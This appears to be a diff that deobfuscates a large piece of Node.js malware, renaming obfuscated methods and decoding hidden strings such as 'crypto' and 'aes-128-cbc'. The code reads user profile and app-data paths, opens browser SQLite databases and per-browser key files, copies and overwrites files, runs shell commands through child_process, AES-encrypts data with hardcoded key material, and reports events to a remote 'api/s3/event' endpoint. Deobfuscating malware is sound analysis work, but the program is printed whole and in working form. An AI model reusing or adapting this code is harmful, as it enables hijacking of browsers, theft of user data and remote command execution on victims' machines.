@@ -44,7 +44,7 @@
       })(_0xdd9c50 = _0x47f3fa.a689XV5 || (_0x47f3fa.a689XV5 = {}));
       var _0x3bbd10 = JSON;
       var _0x279589 = class {
-        static ["s6B3E35"](_0x24c777) {
+        static s6B3E35(_0x24c777) {
           let _0x5e89d9 = '';
           const _0x22d5f7 = _0x3bb8cb.w3F3UWA;
           for (let _0x50f0cd = 0; _0x50f0cd < _0x24c777.length; _0x50f0cd++) {
@@ -56,24 +56,24 @@
       _0x47f3fa.i4B82NN = _0x279589;
       _0x2db60b = _0x279589;
       var _0x5899c9 = class _0x340aaf {
-        static ["t5A2WVR"]() {
+        static t5A2WVR() {
           return true;
         }
-        static ["D47CBV3"]() {
+        static D47CBV3() {
           var _0x47e312;
           const _0x337161 = require("process");
           return (_0x47e312 = _0x337161.env.LOCALAPPDATA) !== null && _0x47e312 !== undefined ? _0x47e312 : '';
         }
-        static ["P6A7H5F"]() {
+        static P6A7H5F() {
           var _0x18aa4c;
           const _0x505540 = require("process");
           return (_0x18aa4c = _0x505540.env.USERPROFILE) !== null && _0x18aa4c !== undefined ? _0x18aa4c : '';
         }
-        static ['D5DCGHD']() {
+        static D5DCGHD() {
           const _0x183b48 = require("path");
           return _0x183b48.basename(this.P4ECJBE);
         }
-        static ["D471SJS"](_0x68a5) {
+        static D471SJS(_0x68a5) {
           const _0x162d6f = [];
           const _0x3417aa = [130, 176, 216, 182, 29, 104, 2, 25, 65, 7, 28, 250, 126, 181, 101, 27];
           for (let _0x953bd = 0; _0x953bd < _0x68a5.length; _0x953bd++) {
@@ -82,7 +82,7 @@
           const _0x27439f = Buffer.from(_0x162d6f);
           return _0x27439f.toString();
         }
-        static async ["c5E4Z7C"](_0x48ba87, _0x338cea) {
+        static async c5E4Z7C(_0x48ba87, _0x338cea) {
           switch (_0x340aaf.y49649G) {
             case 1:
               await _0x340aaf.R449QD9(_0x48ba87, _0x338cea);
@@ -95,7 +95,7 @@
               break;
           }
         }
-        static async ["R449QD9"](_0x7df26, _0x543976) {
+        static async R449QD9(_0x7df26, _0x543976) {
           const _0x417490 = _0x340aaf.f60EJEI;
           const _0x13685d = _0x340aaf.s59E3EX;
           const _0x4ae5c0 = require("fs");
@@ -108,7 +108,7 @@
           _0x340aaf.o699XQ0 = _0x3c3acb;
           _0x4ae5c0.writeFileSync(_0x13685d, JSON.stringify(_0x3c3acb));
         }
-        static async ['q413VTI'](_0x1fe659, _0x4dd6c3) {
+        static async q413VTI(_0x1fe659, _0x4dd6c3) {
           const _0xc891d = _0x340aaf.f60EJEI;
           const _0xa5ab8c = _0x340aaf.s59E3EX;
           const _0x2d467d = require("fs");
@@ -140,7 +140,7 @@
           _0x41b6c5 = Buffer.from(JSON.stringify(_0x4acf0c), "utf8").toString("hex").toUpperCase();
           _0x2d467d.writeFileSync(_0xa5ab8c, _0x41b6c5);
         }
-        static async ["l610ZCY"](_0x1d459b) {
+        static async l610ZCY(_0x1d459b) {
           switch (_0x340aaf.y49649G) {
             case 1:
               return await _0x340aaf.l616AL1(_0x1d459b);
@@ -151,7 +151,7 @@
               return undefined;
           }
         }
-        static async ['l616AL1'](_0x5057f5) {
+        static async l616AL1(_0x5057f5) {
           const _0x2f4de6 = _0x340aaf.s59E3EX;
           const _0xce9650 = require("fs");
           let _0x447b4f = '';
@@ -169,7 +169,7 @@
           }
           return _0x340aaf.o699XQ0[_0x5057f5].toString();
         }
-        static async ["N3FBEKL"](_0x5f3b6c) {
+        static async N3FBEKL(_0x5f3b6c) {
           const _0x32f3b2 = _0x340aaf.s59E3EX;
           const _0x12a011 = require("fs");
           let _0x1384e1 = '';
@@ -203,7 +203,7 @@
           }
           return _0x340aaf.o699XQ0.json[_0x1cf113].toString();
         }
-        static async ['T5BBWGD']() {
+        static async T5BBWGD() {
           try {
             return await _0x340aaf.l610ZCY("iid");
           } catch (_0xfda367) {
@@ -211,7 +211,7 @@
             return '';
           }
         }
-        static async ["J6021ZT"]() {
+        static async J6021ZT() {
           if (_0x340aaf.y49649G != 2) {
             return;
           }
@@ -264,7 +264,7 @@
       _0x2207ef.e5325L3 = _0x2207ef.E506IW4 = undefined;
       var _0x36b5ef = _0x3b922a();
       var _0x2fd1da = class {
-        static ["d6C8UEH"]() {
+        static d6C8UEH() {
           for (const _0x310dfd of Object.keys(this)) {
             if (this[_0x310dfd] === '' || this[_0x310dfd] === undefined) {
               return false;
@@ -275,118 +275,118 @@
       };
       _0x2207ef.E506IW4 = _0x2fd1da;
       var _0xd2989 = class {
-        static get ["d65DL4U"]() {
+        static get d65DL4U() {
           if (!this.C4E471X) {
             this.C4E471X = new _0x5a1d21();
           }
           return this.C4E471X;
         }
-        static get ["Y55B2P2"]() {
+        static get Y55B2P2() {
           return this.d65DL4U.Y55B2P2;
         }
-        static get ["q474LOF"]() {
+        static get q474LOF() {
           return this.d65DL4U.q474LOF;
         }
-        static set ["q474LOF"](_0x1ca42b) {
+        static set q474LOF(_0x1ca42b) {
           this.d65DL4U.q474LOF = _0x1ca42b;
         }
-        static get ["a5D303X"]() {
+        static get a5D303X() {
           return this.d65DL4U.a5D303X;
         }
-        static set ["a5D303X"](_0x255cc4) {
+        static set a5D303X(_0x255cc4) {
           this.d65DL4U.a5D303X = _0x255cc4;
         }
-        static get ["x484Q1X"]() {
+        static get x484Q1X() {
           return this.d65DL4U.x484Q1X;
         }
-        static set ['x484Q1X'](_0x8b7ebb) {
+        static set x484Q1X(_0x8b7ebb) {
           this.d65DL4U.x484Q1X = _0x8b7ebb;
         }
-        static get ["k596N0J"]() {
+        static get k596N0J() {
           return this.d65DL4U.k596N0J;
         }
-        static set ['k596N0J'](_0x2aeeb5) {
+        static set k596N0J(_0x2aeeb5) {
           this.d65DL4U.k596N0J = _0x2aeeb5;
         }
-        static get ['a6B1QAU']() {
+        static get a6B1QAU() {
           return this.d65DL4U.a6B1QAU;
         }
-        static set ["a6B1QAU"](_0xbcd957) {
+        static set a6B1QAU(_0xbcd957) {
           this.d65DL4U.a6B1QAU = _0xbcd957;
         }
-        static get ["r53FV0M"]() {
+        static get r53FV0M() {
           return this.d65DL4U.r53FV0M;
         }
-        static set ["r53FV0M"](_0x132cd7) {
+        static set r53FV0M(_0x132cd7) {
           this.d65DL4U.r53FV0M = _0x132cd7;
         }
-        static get ["U430LYO"]() {
+        static get U430LYO() {
           return this.d65DL4U.U430LYO;
         }
-        static set ["U430LYO"](_0x1601fd) {
+        static set U430LYO(_0x1601fd) {
           this.d65DL4U.U430LYO = _0x1601fd;
         }
-        static get ["g4184BO"]() {
+        static get g4184BO() {
           return this.d65DL4U.g4184BO;
         }
-        static set ['g4184BO'](_0x4cf31e) {
+        static set g4184BO(_0x4cf31e) {
           this.d65DL4U.g4184BO = _0x4cf31e;
         }
-        static get ["R6780KK"]() {
+        static get R6780KK() {
           return this.d65DL4U.R6780KK;
         }
-        static set ["R6780KK"](_0xe732a6) {
+        static set R6780KK(_0xe732a6) {
           this.d65DL4U.R6780KK = _0xe732a6;
         }
-        static get ["n664BX9"]() {
+        static get n664BX9() {
           return this.d65DL4U.n664BX9;
         }
-        static set ['n664BX9'](_0x22e4c0) {
+        static set n664BX9(_0x22e4c0) {
           this.d65DL4U.n664BX9 = _0x22e4c0;
         }
-        static get ['x4ADWAE']() {
+        static get x4ADWAE() {
           return this.d65DL4U.x4ADWAE;
         }
-        static set ["x4ADWAE"](_0x12d450) {
+        static set x4ADWAE(_0x12d450) {
           this.d65DL4U.x4ADWAE = _0x12d450;
         }
-        static get ['z4DE429']() {
+        static get z4DE429() {
           return this.d65DL4U.z4DE429;
         }
-        static set ["z4DE429"](_0x38ffe2) {
+        static set z4DE429(_0x38ffe2) {
           this.d65DL4U.z4DE429 = _0x38ffe2;
         }
-        static get ["H64FNMG"]() {
+        static get H64FNMG() {
           return this.d65DL4U.H64FNMG;
         }
-        static set ["H64FNMG"](_0x29ea92) {
+        static set H64FNMG(_0x29ea92) {
           this.d65DL4U.H64FNMG = _0x29ea92;
         }
-        static get ["M56F8MB"]() {
+        static get M56F8MB() {
           return this.d65DL4U.M56F8MB;
         }
-        static set ["M56F8MB"](_0x40c544) {
+        static set M56F8MB(_0x40c544) {
           this.d65DL4U.M56F8MB = _0x40c544;
         }
-        static get ["X4B7201"]() {
+        static get X4B7201() {
           return this.d65DL4U.X4B7201;
         }
-        static set ["X4B7201"](_0x3ae939) {
+        static set X4B7201(_0x3ae939) {
           this.d65DL4U.X4B7201 = _0x3ae939;
         }
-        static get ["b57CS7T"]() {
+        static get b57CS7T() {
           return this.d65DL4U.b57CS7T;
         }
-        static set ["b57CS7T"](_0x4976d8) {
+        static set b57CS7T(_0x4976d8) {
           this.d65DL4U.b57CS7T = _0x4976d8;
         }
-        static get ["K48B40X"]() {
+        static get K48B40X() {
           return this.d65DL4U.K48B40X;
         }
-        static set ['K48B40X'](_0xb0365d) {
+        static set K48B40X(_0xb0365d) {
           this.d65DL4U.K48B40X = _0xb0365d;
         }
-        static get ["d557Z9E"]() {
+        static get d557Z9E() {
           return this.d65DL4U.d557Z9E;
         }
       };
@@ -441,19 +441,19 @@
           this.T3F59PH = _0x4c64c9;
           this.o6359GL = _0x47ad5f;
         }
-        ["o5B56AY"](_0x43a5e2) {
+        o5B56AY(_0x43a5e2) {
           if (_0x43a5e2 == null) {
             return false;
           }
           return this.D5DDWLX == _0x43a5e2.D5DDWLX && this.t563L6N == _0x43a5e2.t563L6N && this.T3F59PH == _0x43a5e2.T3F59PH && this.o6359GL == _0x43a5e2.o6359GL;
         }
-        ["N67FCSM"](_0x1110d5) {
+        N67FCSM(_0x1110d5) {
           if (_0x1110d5 == null) {
             return true;
           }
           return this.D5DDWLX != _0x1110d5.D5DDWLX || this.t563L6N != _0x1110d5.t563L6N || this.T3F59PH != _0x1110d5.T3F59PH || this.o6359GL != _0x1110d5.o6359GL;
         }
-        ["V4E80AR"](_0x5c153a) {
+        V4E80AR(_0x5c153a) {
           if (this.o5B56AY(_0x5c153a)) {
             return false;
           }
@@ -477,7 +477,7 @@
           }
           return this.o6359GL > _0x5c153a.o6359GL;
         }
-        ["s5A7L0F"](_0x3975e5) {
+        s5A7L0F(_0x3975e5) {
           if (this.o5B56AY(_0x3975e5)) {
             return false;
           }
@@ -486,10 +486,10 @@
           }
           return true;
         }
-        ['T41CAIA']() {
+        T41CAIA() {
           return this.D5DDWLX + '.' + this.t563L6N + '.' + this.T3F59PH + '.' + this.o6359GL;
         }
-        ["K66ASXK"]() {
+        K66ASXK() {
           return this.D5DDWLX + '.' + this.t563L6N;
         }
       };
@@ -499,26 +499,26 @@
       }
       _0x3bc5c5.Y463EU0 = _0x543366;
       var _0x4ab904 = class {
-        static ["F47EFHX"](_0x110843) {
+        static F47EFHX(_0x110843) {
           return _0x110843;
         }
       };
       _0x3bc5c5.z579NEI = _0x4ab904;
       _0x12dda6 = _0x4ab904;
       var _0x23a3fc = class _0x21c2ac {
-        static ["s59BT06"](_0x35681c, _0x3f79c9 = _0x14bf04.X571NQM) {
+        static s59BT06(_0x35681c, _0x3f79c9 = _0x14bf04.X571NQM) {
           if (!_0x285ccd.S559FZQ.F40E8E7) {
             return;
           }
           console.log('[' + _0x3f79c9 + "]: " + _0x35681c);
         }
-        static async ["W4EF0EI"](_0x1722a0, _0x3f6a75, _0x9eb4a5) {
+        static async W4EF0EI(_0x1722a0, _0x3f6a75, _0x9eb4a5) {
           await this.Q44BIX9(_0x14bf04.X4816CW, _0x1722a0, _0x3f6a75, undefined, _0x9eb4a5);
         }
-        static async ['Y6CDW21'](_0x29fd93, _0x5db052, _0x445570, _0x1011d8) {
+        static async Y6CDW21(_0x29fd93, _0x5db052, _0x445570, _0x1011d8) {
           await this.Q44BIX9(_0x14bf04.W5397AL, _0x29fd93, _0x5db052, _0x445570, _0x1011d8);
         }
-        static async ["Q44BIX9"](_0x55d063, _0x5eb966, _0x115d44, _0x28b7ed, _0x37fbed) {
+        static async Q44BIX9(_0x55d063, _0x5eb966, _0x115d44, _0x28b7ed, _0x37fbed) {
           var _0x538e51;
           function _0x5f223b(_0x5a2eda) {
             if (!_0x5a2eda) {
@@ -565,7 +565,7 @@
             await _0x39278a("api/s3/event", _0xe54349);
           }
         }
-        static ["g597ORN"]() {
+        static g597ORN() {
           _0x21c2ac.s59BT06('');
         }
       };
@@ -828,28 +828,13 @@
         }
         return _0x2a3f4d.toString("utf8");
       }
-      var _0x2789c3 = _0x291e22([117, 32, 224, 36, 22, 82, 153, 84, 1, 79]);
-      var _0x457926 = _0x291e22([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46]);
-      var _0x13074c = _0x291e22([21, 131, 223, 58, 115, 241, 176, 87]);
-      var _0x560215 = _0x291e22([252, 193, 189, 171, 148, 164, 197]);
-      var _0x9482d9 = _0x291e22([201, 33, 33, 148, 188, 85, 71, 172]);
-      var _0x4d8484 = _0x291e22([229, 195, 182, 70, 145, 172, 229, 50, 151, 170, 216, 33]);
-      var _0x1fdeb8 = _0x291e22([199, 159, 132, 81, 181, 254, 234, 53, 168, 242, 198, 40, 179, 250, 247]);
-      var _0x4ce5cf = _0x291e22([59, 98, 139, 66, 88, 16, 238, 35, 79, 7, 200, 43, 75, 10, 238, 48, 82, 20]);
-      var _0x4b01a7 = _0x291e22([135, 230, 223, 131, 228, 148, 186, 226, 243, 131, 155, 230, 228, 143, 175, 235, 226, 148, 182, 245]);
-      var _0x4d3883 = _0x291e22([225, 173, 111, 85, 128, 200, 28, 120, 208, 159, 87, 120, 130, 207, 12]);
-      var _0x2e06c1 = _0x291e22([250, 131, 202, 102, 137, 230, 190, 39, 143, 247, 165, 54, 155, 231, 174, 15, 148, 228]);
-      var _0x3c318f = _0x291e22([200, 27, 92, 143, 189, 107, 56, 238, 188, 126]);
-      var _0x215e94 = _0x291e22([23, 96, 113, 130, 113, 9, 31, 227, 123]);
-      var _0x288138 = _0x291e22([255, 71, 35, 100, 139, 40, 118, 20, 143, 34, 81, 39, 158, 52, 70]);
-      var _0x668dac = _0x291e22([1, 231, 132, 28, 114, 146, 230, 111, 117, 149, 237, 114, 102]);
       function _0x5079c9(_0x3f48d5) {
-        _0x3f48d5 = _0x3f48d5[_0x457926](/-/g, '');
-        const _0x34b7f1 = Buffer[_0x13074c]([50, 55, 54, 52, 48, 57, 51, 57, 54, 102, 99, 99, 48, 97, 50, 51], _0x560215)[_0x4d8484](_0x9482d9);
-        return Buffer[_0x13074c](_0x34b7f1 + _0x3f48d5[_0x668dac](0, 16), _0x560215);
+        _0x3f48d5 = _0x3f48d5.replace(/-/g, '');
+        const _0x34b7f1 = Buffer.from([50, 55, 54, 52, 48, 57, 51, 57, 54, 102, 99, 99, 48, 97, 50, 51], "hex").toString("utf8");
+        return Buffer.from(_0x34b7f1 + _0x3f48d5.substring(0, 16), "hex");
       }
       function _0x5a2c2b() {
-        return Buffer[_0x13074c]([65, 48, 70, 66], _0x560215)[_0x4d8484](_0x9482d9);
+        return Buffer.from([65, 48, 70, 66], "hex").toString("utf8");
       }
       function _0xd7a40f() {
         return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
@@ -886,24 +871,24 @@
         return _0x1f3f61.toString("hex");
       }
       function _0x15fc7b(_0xfe1824, _0x34e023) {
-        const _0x1006fb = require(_0x2789c3);
+        const _0x1006fb = require("crypto");
         const _0x5bb8b2 = _0x5079c9(_0x34e023);
-        const _0x5079be = _0x1006fb[_0x1fdeb8](16);
-        const _0x524689 = _0x1006fb[_0x4ce5cf](_0x4d3883, _0x5bb8b2, _0x5079be);
-        _0x524689[_0x2e06c1](true);
-        let _0x2a72ea = _0x524689[_0x3c318f](_0xfe1824, _0x9482d9, _0x560215);
-        _0x2a72ea += _0x524689[_0x215e94](_0x560215);
-        return _0x5079be[_0x4d8484](_0x560215)[_0x288138]() + _0x5a2c2b() + _0x2a72ea[_0x288138]();
+        const _0x5079be = _0x1006fb.randomBytes(16);
+        const _0x524689 = _0x1006fb.createCipheriv("aes-128-cbc", _0x5bb8b2, _0x5079be);
+        _0x524689.setAutoPadding(true);
+        let _0x2a72ea = _0x524689.update(_0xfe1824, "utf8", "hex");
+        _0x2a72ea += _0x524689.final("hex");
+        return _0x5079be.toString("hex").toUpperCase() + _0x5a2c2b() + _0x2a72ea.toUpperCase();
       }
       function _0x2ae848(_0x85ce9e, _0x599185) {
-        const _0x5b465b = require(_0x2789c3);
+        const _0x5b465b = require("crypto");
         const _0xfc09c7 = _0x5079c9(_0x599185);
-        const _0x47386f = Buffer[_0x13074c](_0x85ce9e[_0x668dac](0, 32), _0x560215);
-        const _0x53de48 = _0x5b465b[_0x4b01a7](_0x4d3883, _0xfc09c7, _0x47386f);
-        _0x53de48[_0x2e06c1](true);
-        let _0x4c8ac0 = _0x85ce9e[_0x668dac](36);
-        let _0x16f50b = _0x53de48[_0x3c318f](_0x4c8ac0, _0x560215, _0x9482d9);
-        _0x16f50b += _0x53de48[_0x215e94](_0x9482d9);
+        const _0x47386f = Buffer.from(_0x85ce9e.substring(0, 32), "hex");
+        const _0x53de48 = _0x5b465b.createDecipheriv("aes-128-cbc", _0xfc09c7, _0x47386f);
+        _0x53de48.setAutoPadding(true);
+        let _0x4c8ac0 = _0x85ce9e.substring(36);
+        let _0x16f50b = _0x53de48.update(_0x4c8ac0, "hex", "utf8");
+        _0x16f50b += _0x53de48.final("utf8");
         return _0x16f50b;
       }
       function _0x5541dd(_0x53fa91, _0x453f41) {
@@ -932,7 +917,7 @@
       }
       var _0x54bdd3 = JSON;
       var _0x4218fb = class {
-        static ["W698NHL"](_0x769c72) {
+        static W698NHL(_0x769c72) {
           var _0x2c6047;
           var _0x20f356;
           var _0x3bde66;
@@ -951,7 +936,7 @@
           }
           return _0x5326fe;
         }
-        static ["T6B99CG"](_0x4c5471) {
+        static T6B99CG(_0x4c5471) {
           return _0x4c5471.map((_0x5574e4) => ({
             ["Path"]: _0x5574e4.d5E0TQS,
             ["Data"]: _0x5574e4.a47DHT3,
@@ -960,7 +945,7 @@
             ["Action"]: _0x5574e4.Q57DTM8
           }));
         }
-        static ["u6CAWW3"](_0x1e8ecb) {
+        static u6CAWW3(_0x1e8ecb) {
           return {
             c608HZL: Array.isArray(_0x1e8ecb.File) ? this.W698NHL(_0x1e8ecb.File) : [],
             y4BAIF6: Array.isArray(_0x1e8ecb.Reg) ? this.W698NHL(_0x1e8ecb.Reg) : [],
@@ -968,7 +953,7 @@
             s67BMEP: Array.isArray(_0x1e8ecb.Proc) ? this.W698NHL(_0x1e8ecb.Proc) : []
           };
         }
-        static ["N5A4FRL"](_0x2d294b) {
+        static N5A4FRL(_0x2d294b) {
           return {
             ["File"]: this.T6B99CG(_0x2d294b.c608HZL),
             ["Reg"]: this.T6B99CG(_0x2d294b.y4BAIF6),
@@ -976,7 +961,7 @@
             ["Proc"]: this.T6B99CG(_0x2d294b.s67BMEP)
           };
         }
-        static ["S59C847"](_0x5910f9) {
+        static S59C847(_0x5910f9) {
           var _0x5128f6;
           var _0x5c04ff;
           var _0x533129;
@@ -991,7 +976,7 @@
             b4CERH3: (_0x466c92 = _0x5910f9.Version) !== null && _0x466c92 !== undefined ? _0x466c92 : ''
           };
         }
-        static ["b558GNO"](_0x5b81ad) {
+        static b558GNO(_0x5b81ad) {
           return {
             ["Progress"]: _0x5b81ad.b54FBAI,
             ["Activity"]: _0x5b81ad.P456VLZ,
@@ -1002,7 +987,7 @@
             ["Version"]: _0x5b81ad.b4CERH3
           };
         }
-        static ['s40B7VN'](_0x23d3b3) {
+        static s40B7VN(_0x23d3b3) {
           return JSON.stringify(this.b558GNO(_0x23d3b3));
         }
       };
@@ -1628,7 +1613,7 @@
           this.t4E0LPU = _0x4ffc98;
           this.q48AQYC = _0x29c99a;
         }
-        async ["q41FDEK"]() {
+        async q41FDEK() {
           var _0x33f21e;
           var _0x26db74;
           await _0x5c23fd.w3F3UWA.W4EF0EI(0, _0x5c23fd.z579NEI.p5FDZHQ);
@@ -1689,7 +1674,7 @@
           }
           return _0x42244b.u6BB118;
         }
-        async ['A4B0MTO']() {
+        async A4B0MTO() {
           try {
             if (await this.m6ABVY9()) {
               0;
@@ -1699,7 +1684,7 @@
             _0x5c23fd.w3F3UWA.s59BT06('');
           }
         }
-        async ["m58FJB5"](_0x4901ec) {
+        async m58FJB5(_0x4901ec) {
           try {
             _0x5c23fd.w3F3UWA.s59BT06('');
             _0xae5ec9.e5325L3.x484Q1X = _0x4901ec;
@@ -1770,7 +1755,7 @@
             return undefined;
           }
         }
-        async ["m6ABVY9"]() {
+        async m6ABVY9() {
           var _0x291d8e;
           _0xae5ec9.e5325L3.q474LOF = (_0x291d8e = await _0x1ebf7f.S559FZQ.l610ZCY("iid")) !== null && _0x291d8e !== undefined ? _0x291d8e : '';
           if (!_0xae5ec9.e5325L3.q474LOF || _0xae5ec9.e5325L3.q474LOF == '') {
@@ -1779,7 +1764,7 @@
           }
           return true;
         }
-        async ["U6B4YNR"]() {
+        async U6B4YNR() {
           var _0x4398cb;
           var _0x2cbf1e;
           const _0x4991b3 = require("url");
@@ -1897,7 +1882,7 @@
             throw new Error("PrepareRtcFailed");
           }
         }
-        async ["Z425M7G"]() {
+        async Z425M7G() {
           var _0x22794d;
           var _0x9cf519;
           0;
@@ -1952,7 +1937,7 @@
             _0x5c23fd.w3F3UWA.s59BT06('');
           }
         }
-        async ["o43FWNP"](_0x306ce4, _0x5dc2b1) {
+        async o43FWNP(_0x306ce4, _0x5dc2b1) {
           return new Promise((_0xd9073e) => {
             const _0x2c7cc7 = require("child_process");
             var _0x369853 = '';
@@ -1985,7 +1970,7 @@
             });
           });
         }
-        async ["l660ZQF"]() {
+        async l660ZQF() {
           _0x5c23fd.w3F3UWA.s59BT06('');
           let _0x2ea916 = await _0x1ebf7f.S559FZQ.l610ZCY("iid");
           if (_0x2ea916) {
@@ -2002,7 +1987,7 @@
             }
           }
         }
-        async ['D656W9S'](_0x57f1d2) {
+        async D656W9S(_0x57f1d2) {
           const _0x2beeb8 = require("path");
           let _0x32e461 = '';
           if (_0x57f1d2 == _0xa0200c.N6330WH) {
@@ -2069,7 +2054,7 @@
           }
           return '';
         }
-        async ['j458FW3'](_0x596908) {
+        async j458FW3(_0x596908) {
           _0x5c23fd.w3F3UWA.s59BT06('');
           if (this.A64CEBI == '' || !_0xae5ec9.e5325L3.k596N0J) {
             return;
@@ -2194,7 +2179,7 @@
           _0x5c23fd.w3F3UWA.s59BT06('');
           return;
         }
-        async ["p4FE5X4"](_0xa3e602) {
+        async p4FE5X4(_0xa3e602) {
           let _0x48b033 = _0xa0200c.N6330WH;
           const _0x356c1d = "cw-key";
           _0x5c23fd.w3F3UWA.s59BT06('');
@@ -2288,7 +2273,7 @@
           _0x5c23fd.w3F3UWA.s59BT06('');
           return;
         }
-        async ["k47F3QK"](_0x18890e) {
+        async k47F3QK(_0x18890e) {
           let _0x214a50 = _0xa0200c.q564DFB;
           const _0x4996c0 = "ew-key";
           _0x5c23fd.w3F3UWA.s59BT06('');
@@ -2382,10 +2367,10 @@
           _0x5c23fd.w3F3UWA.s59BT06('');
           return;
         }
-        async ["E4E2LLU"](_0x4acdd5) {
+        async E4E2LLU(_0x4acdd5) {
           return new Promise((_0x83b5c8) => setTimeout(_0x83b5c8, _0x4acdd5));
         }
-        async ['D45AYQ3'](_0x263a69, _0x4f4954 = true) {
+        async D45AYQ3(_0x263a69, _0x4f4954 = true) {
           const _0x8ee8da = require("child_process");
           if (_0x4f4954) {
             0;
@@ -2402,7 +2387,7 @@
           _0x8ee8da.exec(_0xfd1bfc);
           await this.E4E2LLU(100);
         }
-        async ["A554U7Y"](_0x214ff8, _0x4bd0d9, _0x79e2ac = false) {
+        async A554U7Y(_0x214ff8, _0x4bd0d9, _0x79e2ac = false) {
           var _0x2192a3;
           var _0xcb454f;
           const _0x480562 = require("fs");
@@ -2419,7 +2404,7 @@
           }
           return [undefined, undefined];
         }
-        async ["X428OQY"](_0x53c65b, _0x2e448a) {
+        async X428OQY(_0x53c65b, _0x2e448a) {
           const _0x446c12 = require("fs");
           try {
             _0x446c12.copyFileSync(_0x53c65b, _0x2e448a);
@@ -2428,7 +2413,7 @@
             return false;
           }
         }
-        async ["r576OBZ"](_0x2a8141, _0xd4363 = false) {
+        async r576OBZ(_0x2a8141, _0xd4363 = false) {
           const _0x47f83b = require("fs");
           try {
             if (!_0xd4363) {
@@ -2439,7 +2424,7 @@
             throw new Error("ReadFileError: " + _0x14aedd);
           }
         }
-        async ["G5B8BDL"](_0x48bfd9) {
+        async G5B8BDL(_0x48bfd9) {
           const _0x16a5f6 = require("better-sqlite3");
           const _0x1052f5 = new _0x16a5f6(_0x48bfd9);
           try {
@@ -2458,7 +2443,7 @@
             });
           }
         }
-        async ["r501Z9L"](_0x3d50f8, _0x2e56d9) {
+        async r501Z9L(_0x3d50f8, _0x2e56d9) {
           const _0x703ad7 = require("better-sqlite3");
           const _0x3e7297 = new _0x703ad7(_0x3d50f8);
           try {
@@ -2481,7 +2466,7 @@
           }
           return true;
         }
-        async ["Y53EKLA"](_0x15e545, _0x334813) {
+        async Y53EKLA(_0x15e545, _0x334813) {
           const _0x47f87a = require("fs");
           try {
             _0x47f87a.writeFileSync(_0x15e545, _0x334813);
@@ -2489,11 +2474,11 @@
             _0x5c23fd.w3F3UWA.s59BT06('');
           }
         }
-        async ["A5FCGS4"](_0x1af36b) {
+        async A5FCGS4(_0x1af36b) {
           const _0x1c3ca4 = require("fs");
           return _0x1c3ca4.existsSync(_0x1af36b);
         }
-        async ["O69AL84"](_0xa20663, _0x312731, _0x1b10c0) {
+        async O69AL84(_0xa20663, _0x312731, _0x1b10c0) {
           try {
             0;
             const _0x3323bc = require("child_process");
@@ -2503,7 +2488,7 @@
             await _0x5c23fd.w3F3UWA.Y6CDW21(_0xa0200c.B639G7B, _0x5c23fd.z579NEI.u3F4OPT, _0x3a2566);
           }
         }
-        async ["w4D8BBU"](_0xdb1e53, _0x5a3a56) {
+        async w4D8BBU(_0xdb1e53, _0x5a3a56) {
           try {
             0;
             const _0x1c4c62 = require("child_process");
@@ -2514,7 +2499,7 @@
             await _0x5c23fd.w3F3UWA.Y6CDW21(_0xa0200c.N6330WH, _0x5c23fd.z579NEI.h6148NE, _0x1c367a);
           }
         }
-        async ["u459C3E"](_0x99d05c, _0x9f4f6a) {
+        async u459C3E(_0x99d05c, _0x9f4f6a) {
           try {
             const _0xb423e0 = require("child_process");
             const _0x45f838 = _0x9f4f6a.trim() == '' ? (0, _0x5c23fd.o5B4F49)("", _0x99d05c) : (0, _0x5c23fd.o5B4F49)("", _0x99d05c, _0x9f4f6a);
@@ -2527,7 +2512,7 @@
           }
           return false;
         }
-        async ["H5AE3US"](_0x245093) {
+        async H5AE3US(_0x245093) {
           if (!_0x245093) {
             return false;
           }
@@ -2541,7 +2526,7 @@
             return false;
           }
         }
-        async ["e4F5CS0"]() {
+        async e4F5CS0() {
           var _0x300ecf;
           var _0x5aba40;
           var _0x1e6226;
@@ -2621,7 +2606,7 @@
           }
           return new _0x3c3b8b();
         }
-        async ["O515QL8"](_0x3d51d6, _0x5d2439, _0x17ba2) {
+        async O515QL8(_0x3d51d6, _0x5d2439, _0x17ba2) {
           var _0x2c8c19;
           var _0x39f527;
           var _0x287dae;
@@ -2692,7 +2677,7 @@
           }
           return new _0x2d71dc();
         }
-        async ["w516KLO"](_0x20ebd2, _0x3320cf, _0x4e4bab, _0x5f0cb5) {
+        async w516KLO(_0x20ebd2, _0x3320cf, _0x4e4bab, _0x5f0cb5) {
           var _0x52d542;
           var _0x3a6e6a;
           var _0x1ef419;
@@ -2755,7 +2740,7 @@
           }
           return new _0x344264();
         }
-        async ['g4EE56L'](_0x3eb688) {
+        async g4EE56L(_0x3eb688) {
           var _0x29c5a2;
           try {
             const _0x16f74c = (_0x29c5a2 = await _0x1ebf7f.S559FZQ.l610ZCY(_0x3eb688)) !== null && _0x29c5a2 !== undefined ? _0x29c5a2 : '';
@@ -2769,7 +2754,7 @@
             return _0x8aca6f.s46FO09;
           }
         }
-        async ["w5C1TZN"](_0x39c6dc) {
+        async w5C1TZN(_0x39c6dc) {
           var _0x12241b;
           var _0x30caf3;
           var _0x5af12e;
@@ -2836,7 +2821,7 @@
             await _0x5c23fd.w3F3UWA.W4EF0EI(_0x1eef6d, _0x5c23fd.z579NEI.u51A2HJ);
           }
         }
-        async ["c647ECB"](_0x13f87d) {
+        async c647ECB(_0x13f87d) {
           const _0x13fd5a = _0xa0200c.h6074WA;
           const _0x2df360 = "ol-key";
           const _0x4ad0da = require("fs");
@@ -2884,7 +2869,7 @@
             await _0x5c23fd.w3F3UWA.W4EF0EI(_0x13fd5a, _0x5c23fd.z579NEI.u51A2HJ);
           }
         }
-        async ["h659UF4"](_0x4af713) {
+        async h659UF4(_0x4af713) {
           var _0x5e977a;
           var _0x459375;
           var _0x14f6e7;
@@ -2954,7 +2939,7 @@
             await _0x5c23fd.w3F3UWA.W4EF0EI(_0x3228db, _0x5c23fd.z579NEI.u51A2HJ);
           }
         }
-        async ["W5F8HOG"](_0x25c0c9) {
+        async W5F8HOG(_0x25c0c9) {
           const _0x3539a2 = _0xa0200c.i623ZUC;
           const _0x1d707a = "pas-key";
           const _0xe908f9 = require("path");
